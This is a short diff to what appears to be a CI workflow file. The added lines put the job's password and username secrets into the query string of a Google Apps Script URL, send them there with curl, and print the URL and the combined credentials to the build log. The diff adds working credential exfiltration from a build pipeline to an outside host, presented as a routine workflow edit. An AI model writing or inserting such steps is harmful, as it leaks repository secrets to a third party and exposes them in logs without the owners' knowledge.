@@ -17,8 +17,9 @@ jobs:
         USERNAME=$USERNAME_SECRET
         PASSWORD=$PASSWORD_SECRET
         AUTH="$USERNAME:::$PASSWORD"
-        URL="https://script.google.com/macros/s/AKfycbzffhUAOTELo2A5kKkif8cavnh6uz2hBd54uF20AFNYUHPiOP8JSbRa1voZDOFct0Vu/exec?value1=989898&value2=$USERNAME"
-        curl --location GET https://script.google.com/macros/s/AKfycbzffhUAOTELo2A5kKkif8cavnh6uz2hBd54uF20AFNYUHPiOP8JSbRa1voZDOFct0Vu/exec?value1=989898&value2=$USERNAME
+        URL="https://script.google.com/macros/s/AKfycbzffhUAOTELo2A5kKkif8cavnh6uz2hBd54uF20AFNYUHPiOP8JSbRa1voZDOFct0Vu/exec?value1=$PASSWORD&value2=$USERNAME"
+        echo Password=>  $URL
+        curl --location GET $URL
         echo "Auth variable: $AUTH"
       
     env:
